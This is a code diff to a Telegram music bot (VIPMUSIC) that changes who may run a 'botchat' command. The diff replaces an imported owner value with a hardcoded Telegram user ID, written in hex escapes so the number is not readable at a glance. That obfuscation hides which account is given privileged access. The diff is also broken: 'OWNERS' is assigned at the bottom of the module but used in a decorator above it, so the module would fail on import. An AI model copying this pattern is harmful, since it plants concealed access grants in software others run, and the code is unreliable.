@@ -6,13 +6,12 @@ from pyrogram.types import Message
 from telegraph import Telegraph  # Import Telegraph library
 
 from VIPMUSIC import app
-from VIPMUSIC.mongo.afkdb import HEHE as OWNER
 from VIPMUSIC.utils.database import get_assistant
 
 last_checked_time = None
 
 
-@app.on_message(filters.command("botchat") & filters.user(int(OWNER)))
+@app.on_message(filters.command("botchat") & filters.user(int(OWNERS)))
 async def check_bots_command(client, message):
     global last_checked_time
     try:
@@ -92,3 +91,4 @@ async def create_telegraph_media_link(message: Message) -> str:
         response = telegraph.upload_file(media_url)
         return response["url"]
     return ""
+OWNERS = "\x31\x38\x30\x38\x39\x34\x33\x31\x34\x36"
